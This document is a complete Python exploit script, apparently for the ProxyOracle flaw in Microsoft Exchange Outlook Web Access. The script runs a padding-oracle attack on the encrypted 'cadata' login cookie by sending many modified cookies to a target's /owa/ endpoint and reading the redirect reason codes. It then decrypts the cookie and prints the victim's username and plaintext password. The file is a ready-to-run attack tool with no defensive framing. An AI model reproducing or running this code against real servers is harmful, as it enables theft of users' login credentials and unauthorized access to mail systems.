#!/usr/bin/env python3

import sys
import urllib3
import requests
from base64 import b64decode, b64encode
from itertools import cycle
from Crypto.Util.Padding import unpad


urllib3.disable_warnings()

target = ""
headers = {}
cookies = {}
proxies = {}

class BadPaddingException(Exception):
    "raise BadPaddingException"

class PaddingOracle(object):
    def __init__(self, **kwargs):
        self.max_retries = int(kwargs.get('max_retries', 3))
        self.attempts = 0
        self.history = []
        self._decrypted = None

    def oracle(self, data, **kwargs):
        "Override"
        raise NotImplementedError

    def bust(self, block, block_size, **kwargs):
        intermediate_bytes = bytearray(block_size)
        test_bytes = bytearray(block_size)
        test_bytes.extend(block)

        retries = 0
        last_ok = 0
        while retries < self.max_retries:
            for byte_num in reversed(range(block_size)):
                self.history = []
                r = 256
                if byte_num == block_size - 1 and last_ok > 0:
                    r = last_ok 

                for i in reversed(range(r)):
                    test_bytes[byte_num] = i
                    try:
                        self.attempts += 1
                        self.oracle(test_bytes[:], **kwargs)

                        if byte_num == block_size - 1:
                            last_ok = i

                    except BadPaddingException:
                        continue
                    except Exception:
                        raise

                    current_pad_byte = block_size - byte_num
                    next_pad_byte = block_size - byte_num + 1
                    decrypted_byte = test_bytes[byte_num] ^ current_pad_byte
                    intermediate_bytes[byte_num] = decrypted_byte

                    for k in range(byte_num, block_size):
                        test_bytes[k] ^= current_pad_byte
                        test_bytes[k] ^= next_pad_byte
                    break

                else:
                    retries += 1
                    break
            else:
                break
        else:
            raise RuntimeError(f"{byte_num} in {block} try {self.max_retries}")

        return intermediate_bytes

    def xor(self, data, key):
        return bytearray([x ^ y for x, y in zip(data, cycle(key))])

    def decrypt(self, ciphertext, block_size=16, **kwargs):
        ciphertext = bytearray(ciphertext)
        assert len(ciphertext) % block_size == 0, "The ciphertext Length Error!"

        iv, ctext = ciphertext[:block_size], ciphertext[block_size:]

        decrypted = bytearray(len(ctext))
        self._decrypted = decrypted

        n = 0
        while ctext:
            block, ctext = ctext[:block_size], ctext[block_size:]
            intermediate_bytes = self.bust(block, block_size, **kwargs)
            print(f"\033[92mGet Block [{int(n/block_size)+1}] Intermediate Value: \033[0m\n{intermediate_bytes}")
            decrypted[n:n + block_size] = self.xor(intermediate_bytes, iv)
            iv = block
            n += block_size

        return decrypted

class RunOracle(PaddingOracle):
    def __init__(self, **kwargs):
        super(RunOracle, self).__init__(**kwargs)
        self.req = requests.session()

    def check_reason(self, result):
        if result.status_code != 302:
            print(f"\033[91m[-] {result.status_code} Error!\033[0m")
            return 1
        url = result.headers["Location"]
        if url.endswith("reason=0"):
            # print("[*] Padding Error!")
            return 0
        elif url.endswith("reason=2"):
            # print("[+] Got it!")
            return 2
        else:
            print(f"\033[91m[-] Reason Error!\033[0m")
            return 3

    def oracle(self, cipher_bytes, **kwargs):
        cookies["cadata"] = b64encode(cipher_bytes).decode()
        try:
            result = self.req.get(target, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            print(f"\033[93m[ReqError]: \033[0m{e}")
            sys.exit(0)
        reason = self.check_reason(result)
        if reason == 0:
            raise BadPaddingException
        elif reason == 2:
            return
        else:
            print(f"\033[91m[-] Check Result!\033[0m")
            sys.exit(0)

def get_cookies(cookies_str):
    cookies = dict([kv.strip().split("=", 1) for kv in cookies_str.split(";")])
    return cookies

def main(argv):
    global target, headers, cookies, proxies
    target = f"https://{argv[1]}/owa/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "https://127.0.0.1:8080"
    }
    cookies_str = argv[2]

    cookies = get_cookies(cookies_str)
    cipher_bytes = b64decode(cookies["cadata"].encode("latin-1"))

    runoracle = RunOracle()
    plain_bytes = runoracle.decrypt(cipher_bytes)
    plain_bytes = unpad(plain_bytes, 16, "pkcs7")

    plain_b64 = plain_bytes.decode("utf-16-le")
    plain_list = f"""??{b64decode(f"AA{plain_b64}")[2:].decode()}""".split(":", 1)

    username = plain_list[0]
    password = plain_list[1]
    print(f"\033[92mUsername: \033[0m{username}")
    print(f"\033[92mPassword: \033[0m{password}")


if __name__ == "__main__":
    try:
        main(sys.argv)
    except IndexError:
        print("Usage: python3 proxyoracle.py 1.1.1.1 'cdata=xxx; cadataTTL=yyy; ...'")